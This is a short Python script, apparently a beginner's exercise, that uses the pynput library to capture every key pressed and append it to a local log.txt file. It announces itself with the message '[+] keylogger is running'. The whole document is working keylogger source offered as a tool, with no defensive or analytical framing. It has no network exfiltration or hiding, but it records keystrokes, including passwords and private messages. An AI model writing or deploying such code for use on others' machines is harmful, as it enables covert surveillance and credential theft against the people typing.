from pynput.keyboard import Listener # type: ignore

def log_keystrocks(key):  #Creating a Function
    key = str(key).replace("'","") #This is key formate
    with  open("log.txt" , "a") as log_file:   #creating a new file 
        log_file.write(key + "\n")   #key for what that person wrote , /n for creating a new indent or add a new line
        
def start_logging():   # This the function  to start listening to keystrokes
    with Listener(on_press=log_keystrocks) as listener:
        listener.join()
        
        
if __name__ == "__main__":
    print("[+] keylogger is running... (press Ctrl + C to Stop )") 
    start_logging()       
        